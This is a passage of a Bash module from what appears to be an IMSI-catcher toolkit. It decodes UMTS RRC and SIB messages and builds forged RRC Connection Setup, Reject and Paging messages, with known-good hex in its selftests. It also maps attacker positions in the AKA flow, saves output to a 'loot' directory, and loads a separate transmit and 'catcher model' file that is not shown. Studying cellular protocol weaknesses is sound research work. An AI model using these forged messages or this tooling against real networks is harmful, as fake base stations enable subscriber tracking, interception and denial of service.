        printf 'walk\tnone\n'; printf 'limit\tthe message is shorter than the RRCConnectionRequest preamble\n'; return 0; }
    pre=$(uair_bits_int "$bits" "$p" 2); p=$(( p + 2 ))
    printf 'measured_results_on_rach\t%s\n' "$([[ $(( (pre >> 1) & 1 )) == 1 ]] && echo present || echo absent)"
    printf 'non_critical_extensions\t%s\n' "$([[ $(( pre & 1 )) == 1 ]] && echo present || echo absent)"
    uair_walk_identity "$bits" "$p" || uair_trunc
    p=$UAIR_POS
    cause=$(uair_bits_int "$bits" "$p" 5) || uair_trunc
    p=$(( p + 5 ))
    pei=$(uair_bits_int "$bits" "$p" 1) || uair_trunc
    printf 'establishment_cause\t%s\n' "$(uair_enum_name "$cause" "${UAIR_ESTCAUSE[@]}")"
    printf 'protocol_error_indicator\t%s\n' "$([[ $pei == 0 ]] && echo noError || echo errorOccurred)"
    return 0
}

uair_walk_setup() {  # bits, offset after the message-type index
    local bits="$1" p="$2" r3 nce pre i b txid
    r3=$(uair_bits_int "$bits" "$p" 1) || uair_trunc
    p=$(( p + 1 ))
    if (( r3 != 0 )); then
        printf 'walk\tnone\n'
        printf 'limit\tRRCConnectionSetup-later-than-r3 is not walked: its non-critical extension chain (the RRCConnectionSetup-later-than-r3 CHOICE) is not pinned here\n'
        return 0
    fi
    nce=$(uair_bits_int "$bits" "$p" 1) || uair_trunc
    p=$(( p + 1 ))
    printf 'later_non_critical_extensions\t%s\n' "$([[ $nce == 1 ]] && echo present || echo absent)"
    pre=0
    for (( i = 0; i < 10; i++ )); do
        b=$(uair_bits_int "$bits" $(( p + i )) 1) || break
        pre=$(( pre + (b << (9 - i)) ))
    done
    p=$(( p + 10 ))
    if (( pre != 0 )); then
        printf 'r3_ies_optional_bitmap\t%s\n' "$(uair_bin "$pre" 10)"
        printf 'walk\tnone\n'
        printf 'limit\tthe r3-IEs OPTIONAL bitmap is not zero, so the offsets after it depend on which of the ten components are present; the walker pins only the all-absent form it builds\n'
        return 0
    fi
    uair_walk_identity "$bits" "$p" || uair_trunc
    p=$UAIR_POS
    txid=$(uair_bits_int "$bits" "$p" 2) || uair_trunc
    p=$(( p + 2 ))
    printf 'rrc_transaction_identifier\t%s\n' "$txid"
    printf 'srnc_identity\t%03x\n' "$(uair_bits_int "$bits" "$p" 12)"
    printf 's_rnti\t%05x\n' "$(uair_bits_int "$bits" $(( p + 12 )) 20)"
    p=$(( p + 32 ))
    printf 'rrc_state_indicator\t%s\n' "$(uair_enum_name "$(uair_bits_int "$bits" "$p" 2)" "${UAIR_STATEIND[@]}")"
    # UTRAN-DRX-CycleLengthCoefficient: INTEGER(3..9), so the three
    # bits carry the value offset by the lower bound. Raw 7 (the eighth of the
    # eight patterns three bits can hold) is outside the constraint and is
    # reported as such rather than turned into 10.
    b=$(uair_bits_int "$bits" $(( p + 2 )) 3)
    if (( b == 7 )); then
        printf 'utran_drx_cycle_length_coefficient\tinvalid(raw 7 is outside INTEGER(3..9))\n'
    else
        printf 'utran_drx_cycle_length_coefficient\t%s\n' "$(( b + 3 ))"
    fi
    p=$(( p + 5 ))
    printf 'srb_information_setup_list\t%s\n' "$(( $(uair_bits_int "$bits" "$p" 1) + 3 ))"
    printf 'walk\tpartial\n'
    printf 'limit\tthe RB and transport-channel trees after srb-InformationSetupList are not walked; their positions depend on the per-SRB rlc-InfoChoice branch\n'
    return 0
}

uair_walk_reject() {  # bits, offset after the message-type index
    local bits="$1" p="$2" r3 nce redir
    r3=$(uair_bits_int "$bits" "$p" 1) || uair_trunc
    p=$(( p + 1 ))
    if (( r3 != 0 )); then
        printf 'walk\tnone\n'
        printf 'limit\tRRCConnectionReject-later-than-r3 is not walked (the RRCConnectionReject-later-than-r3 CHOICE)\n'
        return 0
    fi
    nce=$(uair_bits_int "$bits" "$p" 1) || uair_trunc
    p=$(( p + 1 ))
    printf 'later_non_critical_extensions\t%s\n' "$([[ $nce == 1 ]] && echo present || echo absent)"
    redir=$(uair_bits_int "$bits" "$p" 1) || uair_trunc
    p=$(( p + 1 ))
    printf 'redirection_info\t%s\n' "$([[ $redir == 1 ]] && echo present || echo absent)"
    uair_walk_identity "$bits" "$p" || uair_trunc
    p=$UAIR_POS
    printf 'rrc_transaction_identifier\t%s\n' "$(uair_bits_int "$bits" "$p" 2)"
    printf 'rejection_cause\t%s\n' "$(uair_enum_name "$(uair_bits_int "$bits" $(( p + 2 )) 1)" "${UAIR_REJCAUSE[@]}")"
    printf 'wait_time\t%s\n' "$(uair_bits_int "$bits" $(( p + 3 )) 4)"
    printf 'walk\tpartial\n'
    printf 'limit\ta present redirectionInfo is not walked; the field above reports its presence bit only\n'
    return 0
}

uair_walk_measreport() {  # bits, offset after the message-type index
    local bits="$1" p="$2" pre i b
    pre=0
    for (( i = 0; i < 5; i++ )); do
        b=$(uair_bits_int "$bits" $(( p + i )) 1) || uair_trunc
        pre=$(( pre + (b << (4 - i)) ))
    done
    p=$(( p + 5 ))
    if (( pre == 0 )); then
        printf 'measurement_identity\t%s\n' "$(( $(uair_bits_int "$bits" "$p" 4) + 1 ))"
    else
        printf 'measurement_report_optional_bitmap\t%s\n' "$(uair_bin "$pre" 5)"
        printf 'walk\tnone\n'
        printf 'limit\tmeasured results present: the MeasuredResults and EventResults CHOICEs (the MeasuredResults and EventResults definitions in clause 10) are not walked here\n'
        return 0
    fi
    printf 'walk\tpartial\n'
    printf 'limit\tthe measurement results themselves are not walked; only the identity is pinned\n'
    return 0
}

# A walker that runs out of bits has found a truncated message, not a message
# it chose not to read: the difference matters, because a truncated message
# must not exit 0 as though every claimed field had been placed. The walkers
# therefore set this flag and keep printing what they could place, and the
# parser turns the flag into exit 1.
UAIR_TRUNC=0
uair_trunc() { UAIR_TRUNC=1; return 0; }

# --parse-rrc <channel>:<hex>. The channel decides which top-level SEQUENCE
# the octets belong to, because that is what fixes where the message-type index
# sits; a bare hex string is read as UL-DCCH, the direction the module decodes.
uair_parse_rrc() {
    local spec="${1:-}" chan hex bits pos ic icv idx t human asn1 assumed=0
    local wst=0 handoff=0
    case "$spec" in
        *:*) chan="${spec%%:*}"; hex="${spec#*:}" ;;
        *)   chan="ul-dcch";     hex="$spec"; assumed=1 ;;
    esac
    chan="${chan,,}"
    case "$chan" in
        pcch|dl-ccch|ul-ccch|dl-dcch|ul-dcch) ;;
        *)  printf 'ERROR\tchannel "%s" is not pcch, dl-ccch, ul-ccch, dl-dcch or ul-dcch\n' "$chan" >&2
            printf 'WHY\tthe channel selects the top-level ASN.1 SEQUENCE (the *-Message envelope of TS 25.331 clause 10) and therefore the bit position of the message-type index; reading it on the wrong channel moves every following bit\n' >&2
            return 2 ;;
    esac
    hex=$(uair_norm_hex "$hex")
    if [[ -z "$hex" ]]; then
        printf 'ERROR\t--parse-rrc needs hex octets\n' >&2
        printf 'WHY\twith no octets there is no top-level CHOICE to read; the build verbs show the encoding direction\n' >&2
        return 2
    fi
    if ! [[ "$hex" =~ ^[0-9a-f]+$ && $(( ${#hex} % 2 )) -eq 0 ]]; then
        printf 'ERROR\t"%s" is not an even-length hex string\n' "$hex" >&2
        printf 'WHY\tan RRC PDU is a whole number of octets on the air; a half octet cannot be classified\n' >&2
        return 2
    fi
    bits=$(uair_hex_to_bits "$hex") || return 2
    UAIR_TRUNC=0

    pos=0
    icv="absent"
    mac=""
    seq=""
    case "$chan" in
        pcch)
            # PCCH-Message has no integrityCheckInfo: PAGING TYPE 1 is not
            # protected, so the one-bit type index is the first thing there.
            idx=$(uair_bits_int "$bits" 0 1) || return 2; pos=1 ;;
        *)
            # The channel envelopes DL-CCCH-Message, UL-CCCH-Message,
            # DL-DCCH-Message and UL-DCCH-Message are SEQUENCEs whose first
            # component is an OPTIONAL integrityCheckInfo, so its presence bit
            # is bit 0 and the message-type CHOICE comes after it, not before.
            # Proven against tshark: ef56df779a0000 (MAC deadbeef, sequence 3)
            # dissects as measurementReport, and reading the index first would
            # have called it uplinkDirectTransfer -- the sort of plausible
            # wrong answer this ordering exists to avoid.
            ic=$(uair_bits_int "$bits" 0 1) || return 2
            pos=1
            if (( ic == 1 )); then
                icv="present"
                # IntegrityCheckInfo ::= SEQUENCE { messageAuthenticationCode,
                # BIT STRING (32) then rrc-MessageSequenceNumber INTEGER(0..15).
                mac=$(uair_bits_int "$bits" 1 32) || return 2
                seq=$(uair_bits_int "$bits" 33 4) || return 2
                pos=37
            fi
            case "$chan" in
                dl-ccch) idx=$(uair_bits_int "$bits" "$pos" 3) || return 2; pos=$(( pos + 3 )) ;;
                ul-ccch) idx=$(uair_bits_int "$bits" "$pos" 2) || return 2; pos=$(( pos + 2 )) ;;
                *)       idx=$(uair_bits_int "$bits" "$pos" 5) || return 2; pos=$(( pos + 5 )) ;;
            esac ;;
    esac

    t=$(uair_rrc_type_of "$chan" "$idx") || t="UNKNOWN	unknown"
    human="${t%%$'\t'*}"
    asn1="${t#*$'\t'}"
    printf 'message\t%s\n'            "$human"
    printf 'message_type\t%s\n'       "$asn1"
    printf 'channel\t%s\n'            "$chan"
    printf 'channel_pinned\t%s\n'     "$([[ $assumed == 1 ]] && echo no || echo yes)"
    printf 'type_index\t%s\n'         "$idx"
    printf 'integrity_check_info\t%s\n' "$icv"
    if [[ -n "$mac" ]]; then
        printf 'message_authentication_code\t%08x\n' "$mac"
        printf 'rrc_message_sequence_number\t%s\n' "$seq"
    fi
    printf 'octets\t%s\n'             "$(( ${#hex} / 2 ))"
    printf 'hex\t%s\n'                "$hex"
    if (( ${#bits} < pos )); then
        printf 'walk\tnone\n'
        printf 'limit\tthe octets end before the message body starts at bit %s\n' "$pos"
        return 1
    fi
    case "$chan:$idx" in
        pcch:0)    uair_walk_paging     "$bits" "$pos" || wst=1 ;;
        dl-ccch:3) uair_walk_setup      "$bits" "$pos" || wst=1 ;;
        dl-ccch:1) uair_walk_reject     "$bits" "$pos" || wst=1 ;;
        ul-ccch:1) uair_walk_request    "$bits" "$pos" || wst=1 ;;
        ul-dcch:8) uair_walk_measreport "$bits" "$pos" || wst=1 ;;
        *)  handoff=1
            printf 'walk\tnone\n'
            printf 'limit\t%s is classified but not walked: the component order after the type index is pinned here only for the messages this module builds and the two uplink ones it parses\n' "$human" ;;
    esac
    if [[ "$icv" == present && "$chan" != ul-dcch ]]; then
        printf 'limit\tthe integrityCheckInfo-before-message ordering of this envelope is the same ASN.1 SEQUENCE shape as the UL-DCCH one the checker dissects, but no %s message carrying an integrityCheckInfo was dissected here, so the ordering is cited rather than proven for this channel\n' "$chan"
    fi
    if (( assumed == 1 )); then
        printf 'limit\tThe octets carry no channel marker. They are read as UL-DCCH by default; the same octets on another logical channel reach a different top-level CHOICE, so pass <channel>:<hex> when the channel is known.\n'
    fi
    printf 'limit\tA PER message carries no length field, so trailing octet padding is indistinguishable from message bits; the fields above are read from the pinned positions only.\n'
    # Exit codes follow the rest of this module: 0 when the message was
    # classified and every field claimed was placed, 3 when the body is
    # handed off (classified but not walked), and 1 when a field that should
    # have been there could not be placed because the octets ran out.
    (( wst == 0 )) || return 1
    (( UAIR_TRUNC == 0 )) || return 1
    (( handoff == 0 )) || return 3
    return 0
}

# ── the transmit half ──────────────────────────────────────────────────
# A separate file because it is a different instrument: everything above reads a
# carrier someone else put on the air, and this writes one. The guard matters --
# a bare source of a missing file would print to stderr, and --status-tsv is
# polled by the GUI, which reads a warning on that stream as a failure.
if [[ -r "$IMSISTING_ROOT/modules/08_umts_air_tx.inc" ]]; then
    # shellcheck source=modules/08_umts_air_tx.inc
    source "$IMSISTING_ROOT/modules/08_umts_air_tx.inc"
else
    umtsa_cmd_transmit() {
        printf 'ERROR\tthe transmit half is missing: modules/08_umts_air_tx.inc not found\n' >&2
        return 2
    }
    umtsa_cmd_catcher_model() {
        printf 'ERROR\tthe catcher model is missing: modules/08_umts_air_tx.inc not found\n' >&2
        return 2
    }
fi

# ── CLI verbs ───────────────────────────────────────────────────────────
uair_cli_status_tsv() {
    local sdr stack
    sdr=$(uair_find_sdr) || sdr="none"
    stack=$(uair_find_umts_stack) || stack="none"
    printf 'sdr\t%s\n'              "$sdr"
    printf 'umts_stack\t%s\n'       "$stack"
    printf 'sib_records\t%s\n'      "$(uair_sib_count)"
    printf 'dir\t%s\n'              "$UAIR_DIR"
    printf 'store\t%s\n'            "$UAIR_SIB_STORE"
    printf 'raster_khz\t%s\n'       "$UAIR_RASTER_KHZ"
    printf 'uarfcn_max\t16383\n'
    printf 'count_i_bits\t32\n'
    printf 'fresh_bits\t32\n'
    printf 'ik_bits\t128\n'
    printf 'mac_i_bits\t32\n'
}

uair_cmd_decode_sib() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || {
        printf 'ERROR\tusage: --decode-sib <hex>\n' >&2; return 2; }
    uair_decode_sib "$hex"
}

# ── selftest — no radio, no root, no network ────────────────────────────
uair_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad + 1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot"
    export CAPTURES_DIR="$d/captures"
    export UAIR_DIR="$d/loot/umts_air"
    export UAIR_SIB_STORE="$UAIR_DIR/sib.tsv"

    # 1. UARFCN arithmetic against the 200 kHz raster: F = 0.2 * N.
    chk uarfcn-10562 "$(uair_uarfcn_to_mhz 10562)" "2112.4"
    chk uarfcn-10838 "$(uair_uarfcn_to_mhz 10838)" "2167.6"
    chk uarfcn-0     "$(uair_uarfcn_to_mhz 0)"     "0.0"
    chk uarfcn-10700 "$(uair_uarfcn_to_mhz 10700)" "2140.0"
    chk uarfcn-9662  "$(uair_uarfcn_to_mhz 9662)"  "1932.4"
    chk uarfcn-4357  "$(uair_uarfcn_to_mhz 4357)"  "871.4"
    chk uarfcn-16383 "$(uair_uarfcn_to_mhz 16383)" "3276.6"
    #    The 200 kHz raster is exactly the 5 MHz-raster form read in 1 MHz
    #    steps; check the relation rather than the coincidence.
    chk uarfcn-raster-rel "$(awk -v a="$(uair_uarfcn_to_mhz 10562)" \
                                -v b="$(uair_uarfcn_to_mhz_5mhz_raster 10562)" \
                                'BEGIN{print (b == a*25) ? "y" : "n"}')" "y"
    #    Out of range and non-numeric must fail, not guess.
    chk uarfcn-range   "$(uair_uarfcn_to_mhz 20000 >/dev/null 2>&1; echo $?)" "2"
    chk uarfcn-nonnum  "$(uair_uarfcn_to_mhz abc >/dev/null 2>&1; echo $?)"   "2"
    chk uarfcn-missing "$(uair_cmd_uarfcn >/dev/null 2>&1; echo $?)"          "2"

    #    Reverse mapping: a frequency on the raster round-trips exactly.
    out=$(uair_mhz_to_uarfcn 2112.4)
    chk mhz-rev-uarfcn "$(fld "$out" uarfcn)" "10562"
    chk mhz-rev-exact  "$(fld "$out" rounding_error_khz)" "0.0"
    #    A frequency off the raster reports a non-zero rounding error.
    chk mhz-off-raster "$(printf '%s\n' "$(uair_mhz_to_uarfcn 2112.45)" | \
            awk -F'\t' '$1=="rounding_error_khz"{print ($2 != 0) ? "y":"n"}')" "y"
    chk mhz-bad        "$(uair_mhz_to_uarfcn xyz >/dev/null 2>&1; echo $?)" "2"

    #    Band identification from the N range.
    chk band-1  "$(uair_band_of_uarfcn 10562 | cut -f1)" "1"
    chk band-2  "$(uair_band_of_uarfcn 9662  | cut -f1)" "2"
    chk band-5  "$(uair_band_of_uarfcn 4357  | cut -f1)" "5"
    chk band-8  "$(uair_band_of_uarfcn 2937  | cut -f1)" "8"
    chk band-x  "$(uair_band_of_uarfcn 16000 >/dev/null 2>&1; echo $?)" "1"
    out=$(uair_cmd_uarfcn 10562)
    chk cmd-uarfcn-freq "$(fld "$out" freq_mhz)" "2112.4"
    chk cmd-uarfcn-band "$(fld "$out" band)"     "1"

    # 2. SIB parse of a real hex blob.
    #    SIB3 tag = 3 -> first 5 bits 00011, then a 28-bit cell identity.
    #    Build: tag 00011 | CI 0000000000000000000000000001
    #    bits = 00011 0000000000000000000000000001 -> pad to octets.
    local sib3; sib3=$(uair_bits_to_hex "00011$(uair_bin 1 28)")
    chk sib3-tag   "$(fld "$(uair_decode_sib "$sib3")" sib_tag)" "3"
    chk sib3-name  "$(fld "$(uair_decode_sib "$sib3")" sib)"     "SIB3"
    chk sib3-ci    "$(fld "$(uair_decode_sib "$sib3")" cell_identity)" "1"
    chk sib3-cibits "$(fld "$(uair_decode_sib "$sib3")" cell_identity_bits)" "28"

    #    A non-trivial cell identity round-trips through the 28-bit field.
    local ci_in=268435455    # 0x0FFFFFFF, all 28 bits set
    local sib3b; sib3b=$(uair_bits_to_hex "00011$(uair_bin "$ci_in" 28)")
    chk sib3-ci-max "$(fld "$(uair_decode_sib "$sib3b")" cell_identity)" "$ci_in"

    #    SIB7 carries the uplink interference level in dBm. Tag 7 = 00111,
    #    then a 6-bit field whose value + (-110) is the dBm level.
    local sib7; sib7=$(uair_bits_to_hex "00111$(uair_bin 40 6)")
    chk sib7-tag  "$(fld "$(uair_decode_sib "$sib7")" sib_tag)" "7"
    chk sib7-name "$(fld "$(uair_decode_sib "$sib7")" sib)"     "SIB7"
    chk sib7-dbm  "$(fld "$(uair_decode_sib "$sib7")" ul_interference_dbm)" "-70"

    #    Unknown tag must warn, not invent fields.
    local sibx; sibx=$(uair_bits_to_hex "11111$(uair_bin 0 27)")
    chk sib-unknown-tag  "$(fld "$(uair_decode_sib "$sibx")" sib_tag)" "31"
    chk sib-unknown-warn "$(fld "$(uair_decode_sib "$sibx")" warning | grep -c .)" "1"

    #    Argument validation.
    chk sib-nonhex  "$(uair_decode_sib 'zzzz' >/dev/null 2>&1; echo $?)" "2"
    chk sib-short   "$(uair_decode_sib 'ab' >/dev/null 2>&1; echo $?)"   "1"
    chk sib-missing "$(uair_cmd_decode_sib >/dev/null 2>&1; echo $?)"    "2"

    #    SIB field map: every SIB the task names must be documented.
    local fm; fm=$(uair_sib_fields_tsv)
    chk sibmap-header "$(printf '%s\n' "$fm" | head -1)" "sib	carries	key_fields"
    chk sibmap-fields "$(printf '%s\n' "$fm" | tail -n +2 | awk -F'\t' 'NF!=3' | grep -c .)" "0"
    local s
    for s in SIB3 SIB5 SIB6 SIB7 SIB11 SIB12; do
        chk "sibmap-${s}" "$(printf '%s\n' "$fm" | awk -F'\t' -v x="$s" '$1==x' | grep -c .)" "1"
    done
    chk sibmap-sib3-ci    "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="SIB3"{print ($3 ~ /CellIdentity/) ? "y":"n"}')" "y"
    chk sibmap-sib5-nb    "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="SIB5"{print ($3 ~ /neighbour/) ? "y":"n"}')" "y"
    chk sibmap-sib6-uarfcn "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="SIB6"{print ($3 ~ /UARFCN/) ? "y":"n"}')" "y"
    chk sibmap-sib11-meas "$(printf '%s\n' "$fm" | awk -F'\t' '$1=="SIB11"{print ($3 ~ /measurement/) ? "y":"n"}')" "y"
    chk sib-name-3 "$(uair_sib_name 3)"  "SIB3"
    chk sib-name-11 "$(uair_sib_name 11)" "SIB11"
    chk sib-name-x "$(uair_sib_name 99)" "unknown"

    #    SIB6 carrier list: adjacent 5 MHz carriers are 25 UARFCN apart.
    out=$(uair_sib6_carriers 10562 3)
    chk sib6-rows    "$(printf '%s\n' "$out" | tail -n +2 | grep -c .)" "3"
    chk sib6-first   "$(printf '%s\n' "$out" | awk -F'\t' 'NR==2{print $2}')" "10562"
    chk sib6-second  "$(printf '%s\n' "$out" | awk -F'\t' 'NR==3{print $2}')" "10587"
    chk sib6-freq    "$(printf '%s\n' "$out" | awk -F'\t' 'NR==3{print $3}')" "2117.4"
    chk sib6-bad     "$(uair_sib6_carriers 1 0 >/dev/null 2>&1; echo $?)" "2"
    chk sib6-bad-n   "$(uair_sib6_carriers x 1 >/dev/null 2>&1; echo $?)" "2"

    # 3. MAC-I input assembly, byte-exact.
    #    COUNT-I = 0x398a59b4, FRESH = 0xec9e8bb6, DIRECTION = 1 (downlink),
    #    IK = 16 zero octets, MESSAGE = 0x0004.
    out=$(uair_mac_input 398a59b4 ec9e8bb6 1 00000000000000000000000000000000 0004)
    chk mac-count   "$(fld "$out" count_i)"   "398a59b4"
    chk mac-fresh   "$(fld "$out" fresh)"     "ec9e8bb6"
    chk mac-dir     "$(fld "$out" direction)" "1"
    chk mac-dirname "$(fld "$out" direction_name)" "downlink"
    chk mac-ik-len  "$(printf '%s' "$(fld "$out" ik)" | wc -c | tr -d ' ')" "32"
    chk mac-input   "$(fld "$out" mac_input)" "398a59b4ec9e8bb6000000010004"
    chk mac-bits    "$(fld "$out" mac_input_bits)" "112"
    chk mac-i-bits  "$(fld "$out" mac_i_bits)" "32"
    chk mac-ik-bits "$(uair_cli_status_tsv | awk -F'\t' '$1=="ik_bits"{print $2}')" "128"

    #    DIRECTION 0 is uplink and must show the zero word.
    out=$(uair_mac_input 398a59b4 ec9e8bb6 0 00000000000000000000000000000000 0004)
    chk mac-dir0     "$(fld "$out" direction_name)" "uplink"
    chk mac-input0   "$(fld "$out" mac_input)" "398a59b4ec9e8bb6000000000004"

    #    COUNT-I construction: (HFN << 8) | SN.
    chk count-i      "$(uair_count_i 0x398a59 0xb4)" "398a59b4"
    chk count-i-zero "$(uair_count_i 0 0)"           "00000000"
    chk count-i-max  "$(uair_count_i 16777215 255)"  "ffffffff"
    chk count-i-hfn  "$(uair_count_i 16777216 0 >/dev/null 2>&1; echo $?)" "2"
    chk count-i-sn   "$(uair_count_i 0 256 >/dev/null 2>&1; echo $?)"      "2"
    chk count-i-hex  "$(uair_count_i 0x398a59 0xb4)" "398a59b4"
    chk count-i-text "$(uair_count_i zz qq >/dev/null 2>&1; echo $?)"      "2"

    #    Argument validation on the MAC input.
    chk mac-missing  "$(uair_mac_input >/dev/null 2>&1; echo $?)" "2"
    chk mac-bad-dir  "$(uair_mac_input 1 1 2 00000000000000000000000000000000 00 >/dev/null 2>&1; echo $?)" "2"
    chk mac-short-ik "$(uair_mac_input 1 1 1 0011 00 >/dev/null 2>&1; echo $?)" "2"
    chk mac-bad-msg  "$(uair_mac_input 1 1 1 00000000000000000000000000000000 zz >/dev/null 2>&1; echo $?)" "2"
    chk mac-bad-cnt  "$(uair_mac_input zzzzz 1 1 00000000000000000000000000000000 00 >/dev/null 2>&1; echo $?)" "2"

    # 4. Integrity analysis: the unprotected messages must be flagged.
    local ia; ia=$(uair_integrity_analysis_tsv)
    chk integ-header "$(printf '%s\n' "$ia" | head -1)" \
        "message	integrity_protected	consequence_if_not"
    chk integ-fields "$(printf '%s\n' "$ia" | tail -n +2 | awk -F'\t' 'NF!=3' | grep -c .)" "0"
    chk integ-rows   "$(printf '%s\n' "$ia" | tail -n +2 | grep -c .)" "10"
    chk integ-smc-no "$(printf '%s\n' "$ia" | awk -F'\t' '$1=="SECURITY MODE COMMAND"{print $2}')" "yes"
    chk integ-paging "$(printf '%s\n' "$ia" | awk -F'\t' '$1=="PAGING TYPE 1"{print $2}')" "no"
    chk integ-sysinfo "$(printf '%s\n' "$ia" | awk -F'\t' '$1=="SYSTEM INFORMATION"{print $2}')" "no"
    chk integ-null  "$(printf '%s\n' "$ia" | awk -F'\t' '$1=="SECURITY MODE COMMAND"{print ($3 ~ /UIA0/) ? "y":"n"}')" "y"
    chk integ-req-no "$(printf '%s\n' "$ia" | awk -F'\t' '$1=="RRC CONNECTION REQUEST"{print $2}')" "no"

    # 5. AKA flow: the real message sequence and the attacker positions.
    local ak; ak=$(uair_aka_flow_tsv)
    chk aka-header "$(printf '%s\n' "$ak" | head -1)" \
        "step	from	to	message	carries	attacker_position"
    chk aka-fields "$(printf '%s\n' "$ak" | tail -n +2 | awk -F'\t' 'NF!=6' | grep -c .)" "0"
    chk aka-steps  "$(printf '%s\n' "$ak" | tail -n +2 | awk -F'\t' '$1 ~ /^[0-9]+$/' | grep -c .)" "6"
    chk aka-authreq "$(printf '%s\n' "$ak" | awk -F'\t' '$4=="AUTHENTICATION REQUEST"{print $5}')" "RAND(128) || AUTN(128)"
    chk aka-rand    "$(printf '%s\n' "$ak" | awk -F'\t' '$4=="AUTHENTICATION REQUEST"{print ($5 ~ /RAND/) ? "y":"n"}')" "y"
    chk aka-autn    "$(printf '%s\n' "$ak" | awk -F'\t' '$4=="AUTHENTICATION REQUEST"{print ($5 ~ /AUTN/) ? "y":"n"}')" "y"
    chk aka-res     "$(printf '%s\n' "$ak" | awk -F'\t' '$4=="Authentication Response"{print $5}')" "RES(64)"
    chk aka-vector  "$(printf '%s\n' "$ak" | awk -F'\t' '$1=="1"{print ($5 ~ /CK/) ? "y":"n"}')" "y"
    chk aka-relay   "$(printf '%s\n' "$ak" | awk -F'\t' '$1=="attacker_relay"{print ($2 ~ /relay/) ? "y":"n"}')" "y"
    chk aka-fakenb  "$(printf '%s\n' "$ak" | awk -F'\t' '$1=="attacker_fake_nodeb"{print ($5 ~ /MAC-A/) ? "y":"n"}')" "y"
    chk aka-sqn     "$(printf '%s\n' "$ak" | awk -F'\t' '$1=="sqn_replay"' | grep -c .)" "1"

    # 6. Hex plumbing, shared contract.
    chk hex-norm "$(uair_norm_hex 'AB CD')" "abcd"
    chk hex-bits "$(uair_hex_to_bits 'a5')" "10100101"
    chk bits-rt  "$(uair_bits_to_hex "$(uair_hex_to_bits 'deadbeef')")" "deadbeef"
    chk field-ok "$(uair_field 'abcd' 8 8)" "205"
    chk field-oob "$(uair_field 'ab' 12 8 >/dev/null 2>&1; echo $?)" "1"

    # 7. Sanitisation of untrusted text.
    local evil; evil=$(uair_sanitize $'Evil\tNodeB\r\nRow')
    chk sanitize-tabs "$(printf '%s' "$evil" | tr -cd '\t' | wc -c | tr -d ' ')" "0"
    chk sanitize-nl   "$(printf '%s' "$evil" | tr -cd '\n' | wc -c | tr -d ' ')" "0"

    # 8. Status TSV contract. SDR presence is environment-dependent.
    out=$(uair_cli_status_tsv)
    chk status-dir     "$(fld "$out" dir)"        "$UAIR_DIR"
    chk status-store   "$(fld "$out" store)"      "$UAIR_SIB_STORE"
    chk status-raster  "$(fld "$out" raster_khz)" "200"
    chk status-max     "$(fld "$out" uarfcn_max)" "16383"
    chk status-counti  "$(fld "$out" count_i_bits)" "32"
    chk status-fresh   "$(fld "$out" fresh_bits)"   "32"
    chk status-ik      "$(fld "$out" ik_bits)"      "128"
    chk status-maci    "$(fld "$out" mac_i_bits)"   "32"

    # 9. CLI dispatch: unknown verb is a usage error, not a success.
    chk cli-unknown "$(uair_cli_main --nope >/dev/null 2>&1; echo $?)" "2"

    # 10. Forged RRC octets, TS 25.331 unaligned PER. Every expected string
    # below was produced by an independent encoder of the same ASN.1 (pycrate's
    # transcription of TS 25.331) and then dissected by Wireshark's RRC
    # dissector, so these are known answers rather than this module's output
    # restated. tools/check-umts-rrc.sh repeats the dissection independently.
    local rrc_hex rrc_bits up_setup up_reject
    rrc_hex()  { uair_cli_main "$1" "${2:-}" 2>/dev/null | awk -F'\t' '$1=="hex"{print $2}'; }
    rrc_bits() { uair_cli_main "$1" "${2:-}" 2>/dev/null | awk -F'\t' '$1=="bits"{print $2}'; }
    up_setup=300022468acf0002010001048c48d147818c2e41b01a00108008601a00528018a01a00948028e01a00d680300020800618663600008200186198d8
    up_reject=10448d159e000402000220
    chk rrc-setup-bits  "$(rrc_bits --build-rrc-setup)"  "469"
    chk rrc-setup-bytes "$(uair_cli_main --build-rrc-setup | awk -F'\t' '$1=="bytes"{print $2}')" "59"
    chk rrc-setup-hex   "$(rrc_hex  --build-rrc-setup)"  "$up_setup"
    chk rrc-reject-bits "$(rrc_bits --build-rrc-reject)" "86"
    chk rrc-reject-hex  "$(rrc_hex  --build-rrc-reject)" "$up_reject"
    chk rrc-paging-bits "$(rrc_bits --build-paging)"     "51"
    chk rrc-paging-hex  "$(rrc_hex  --build-paging)"     "60022468acf000"
    chk rrc-sent        "$(uair_cli_main --build-rrc-setup | awk -F'\t' '$1=="sent"{print $2}')" "0"
    chk rrc-limit       "$(uair_cli_main --build-paging | awk -F'\t' '$1=="limit"' | grep -c 'MAC-I')" "1"
    # The wait time is the field the reject exists for; it is pinned by parsing
    # the proven octets back, which places it by clause rather than by memory.
    chk rrc-reject-wait "$(uair_cli_main --parse-rrc "dl-ccch:$up_reject" | awk -F'\t' '$1=="wait_time"{print $2}')" "8"
    chk rrc-reject-cause "$(uair_cli_main --parse-rrc "dl-ccch:$up_reject" | awk -F'\t' '$1=="rejection_cause"{print $2}')" "congestion"
    chk rrc-setup-ident "$(uair_cli_main --parse-rrc "dl-ccch:$up_setup" | awk -F'\t' '$1=="initial_ue_identity"{print $2}')" "tmsi-and-LAI"
    chk rrc-setup-srb   "$(uair_cli_main --parse-rrc "dl-ccch:$up_setup" | awk -F'\t' '$1=="srb_information_setup_list"{print $2}')" "4"
    chk rrc-setup-drx   "$(uair_cli_main --parse-rrc "dl-ccch:$up_setup" | awk -F'\t' '$1=="utran_drx_cycle_length_coefficient"{print $2}')" "6"
    chk rrc-paging-ue   "$(uair_cli_main --parse-rrc "pcch:60022468acf000" | awk -F'\t' '$1=="tmsi"{print $2}')" "12345678"
    chk rrc-req-cause   "$(uair_cli_main --parse-rrc ul-ccch:2112345678001008000b00 | awk -F'\t' '$1=="establishment_cause"{print $2}')" "registration"
    chk rrc-req-lac     "$(uair_cli_main --parse-rrc ul-ccch:2112345678001008000b00 | awk -F'\t' '$1=="lac"{print $2}')" "0001"
